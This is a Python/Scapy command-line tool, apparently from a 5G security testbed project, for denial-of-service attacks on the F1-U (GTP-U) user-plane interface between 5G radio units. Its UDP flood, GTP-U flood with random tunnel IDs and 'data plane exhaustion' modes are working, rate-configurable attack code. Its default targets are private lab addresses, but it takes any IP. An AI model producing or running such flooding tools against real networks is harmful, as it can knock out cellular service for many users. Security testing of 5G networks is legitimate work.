#!/usr/bin/env python3

import argparse
import sys
import time
import logging
from scapy.all import *
from scapy.contrib.gtp import GTPHeader, GTPEchoRequest
import random

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class F1UAttacker:
    def __init__(self, target_ip, target_port=2152, source_ip=None):
        self.target_ip = target_ip
        self.target_port = target_port
        self.source_ip = source_ip or self._get_source_ip()
        self.attack_active = True
        
        logger.info(f"F1-U Attacker initialized")
        logger.info(f"Target: {self.target_ip}:{self.target_port}")
        logger.info(f"Source: {self.source_ip}")
    
    def _get_source_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "192.168.1.100"
    
    def udp_flood(self, packet_size=1024, rate=10000, duration=60):
        logger.info(f"Launching UDP Flood attack")
        logger.info(f"Packet Size: {packet_size} bytes, Rate: {rate}/sec, Duration: {duration}sec")
        
        start_time = time.time()
        sent_count = 0
        sent_bytes = 0
        
        payload = os.urandom(packet_size)
        
        while time.time() - start_time < duration and self.attack_active:
            batch_start = time.time()
            
            for _ in range(rate):
                if not self.attack_active:
                    break
                
                try:
                    pkt = IP(src=self.source_ip, dst=self.target_ip) / \
                          UDP(sport=random.randint(30000, 60000), dport=self.target_port) / \
                          Raw(load=payload)
                    
                    send(pkt, verbose=0)
                    sent_count += 1
                    sent_bytes += packet_size
                except Exception as e:
                    logger.error(f"Error sending packet: {e}")
            
            elapsed = time.time() - batch_start
            if elapsed < 1.0:
                time.sleep(1.0 - elapsed)
            
            if sent_count % 10000 == 0:
                mbps = (sent_bytes * 8) / ((time.time() - start_time) * 1000000)
                logger.info(f"Sent {sent_count} packets ({sent_bytes/(1024*1024):.2f} MB, {mbps:.2f} Mbps)...")
        
        total_time = time.time() - start_time
        avg_rate = sent_count / total_time
        avg_mbps = (sent_bytes * 8) / (total_time * 1000000)
        
        logger.info(f"Attack completed.")
        logger.info(f"Total packets: {sent_count}, Total bytes: {sent_bytes/(1024*1024):.2f} MB")
        logger.info(f"Average rate: {avg_rate:.2f} pps, {avg_mbps:.2f} Mbps")
    
    def gtp_flood(self, rate=5000, duration=60):
        logger.info(f"Launching GTP-U Flood attack")
        logger.info(f"Rate: {rate}/sec, Duration: {duration}sec")
        
        start_time = time.time()
        sent_count = 0
        
        while time.time() - start_time < duration and self.attack_active:
            batch_start = time.time()
            
            for _ in range(rate):
                if not self.attack_active:
                    break
                
                self._send_gtp_packet()
                sent_count += 1
            
            elapsed = time.time() - batch_start
            if elapsed < 1.0:
                time.sleep(1.0 - elapsed)
            
            if sent_count % 5000 == 0:
                logger.info(f"Sent {sent_count} GTP packets...")
        
        logger.info(f"Attack completed. Total GTP packets sent: {sent_count}")
    
    def data_plane_exhaustion(self, packet_size=1500, rate=8000, duration=60):
        logger.info(f"Launching Data Plane Exhaustion attack")
        logger.info(f"Packet Size: {packet_size} bytes, Rate: {rate}/sec, Duration: {duration}sec")
        
        start_time = time.time()
        sent_count = 0
        sent_bytes = 0
        
        while time.time() - start_time < duration and self.attack_active:
            batch_start = time.time()
            
            for _ in range(rate):
                if not self.attack_active:
                    break
                
                teid = random.randint(1, 0xFFFFFFFF)
                payload = os.urandom(packet_size - 50)
                
                try:
                    pkt = IP(src=self.source_ip, dst=self.target_ip) / \
                          UDP(sport=random.randint(30000, 60000), dport=self.target_port) / \
                          GTPHeader(teid=teid, gtp_type=255, length=len(payload)) / \
                          Raw(load=payload)
                    
                    send(pkt, verbose=0)
                    sent_count += 1
                    sent_bytes += packet_size
                except Exception as e:
                    logger.error(f"Error sending GTP packet: {e}")
            
            elapsed = time.time() - batch_start
            if elapsed < 1.0:
                time.sleep(1.0 - elapsed)
            
            if sent_count % 8000 == 0:
                mbps = (sent_bytes * 8) / ((time.time() - start_time) * 1000000)
                logger.info(f"Sent {sent_count} packets ({mbps:.2f} Mbps)...")
        
        logger.info(f"Attack completed. Total packets: {sent_count}")
    
    def _send_gtp_packet(self):
        try:
            teid = random.randint(1, 0xFFFFFFFF)
            seq_num = random.randint(0, 0xFFFF)
            
            payload = os.urandom(random.randint(100, 1400))
            
            pkt = IP(src=self.source_ip, dst=self.target_ip) / \
                  UDP(sport=random.randint(30000, 60000), dport=self.target_port) / \
                  GTPHeader(teid=teid, gtp_type=255, seq=seq_num, length=len(payload)) / \
                  Raw(load=payload)
            
            send(pkt, verbose=0)
        except Exception as e:
            logger.error(f"Error sending GTP packet: {e}")
    
    def stop(self):
        logger.info("Stopping attack...")
        self.attack_active = False

def main():
    parser = argparse.ArgumentParser(description='F1-U Interface Attack Tool')
    parser.add_argument('--type', required=True,
                       choices=['udp_flood', 'gtp_flood', 'data_plane_exhaustion'],
                       help='Attack type')
    parser.add_argument('--target', required=True, help='Target IP or identifier (cu_cp, cu_up, du)')
    parser.add_argument('--mode', default='manual', choices=['manual', 'auto'], help='Attack mode')
    parser.add_argument('--packet-size', type=int, default=1024, help='Packet size in bytes')
    parser.add_argument('--rate', type=int, default=10000, help='Attack rate (packets/sec)')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration (seconds)')
    
    args = parser.parse_args()
    
    target_map = {
        'cu_cp': '192.168.71.130',
        'cu_up': '192.168.71.131',
        'du': '192.168.71.132'
    }
    
    target_ip = target_map.get(args.target, args.target)
    
    logger.info("="*60)
    logger.info("F1-U Attack Tool - SP5G Project")
    logger.info("="*60)
    
    attacker = F1UAttacker(target_ip)
    
    try:
        if args.type == 'udp_flood':
            attacker.udp_flood(args.packet_size, args.rate, args.duration)
        elif args.type == 'gtp_flood':
            attacker.gtp_flood(args.rate, args.duration)
        elif args.type == 'data_plane_exhaustion':
            attacker.data_plane_exhaustion(args.packet_size, args.rate, args.duration)
        
        logger.info("Attack finished successfully")
    except KeyboardInterrupt:
        logger.info("Attack interrupted by user")
        attacker.stop()
    except Exception as e:
        logger.error(f"Attack failed: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()



